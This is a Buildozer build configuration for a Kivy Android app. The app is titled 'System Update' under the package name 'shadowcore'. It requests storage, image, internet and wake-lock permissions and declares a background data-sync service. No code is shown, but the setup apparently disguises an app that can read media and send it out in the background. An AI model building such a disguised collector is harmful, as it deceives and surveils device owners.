[app]

# (str) Title of your application
title = System Update

# (str) Package name
package.name = shadowcore

# (str) Package domain (needed for android packaging)
package.domain = org.test

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.0

# (list) Application requirements
# تم ضبط المكتبات لتعمل مع نسخة الخدمة التلقائية المستقرة
requirements = python3,kivy==2.2.1,pyjnius,requests,urllib3,certifi

# (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)
# تم التعديل ليكون الوضع طولياً دائماً
orientation = portrait

# (list) Permissions
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android architectures to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a, armeabi-v7a

# (bool) use pose-notifications for android API 33+
android.enable_androidx = True

# (list) Android services to create (name:file.py)
services = Service:service.py

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (bool) Copy library instead of making a libpython.so
android.copy_libs = 1

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = no, 1 = yes)
warn_on_root = 1
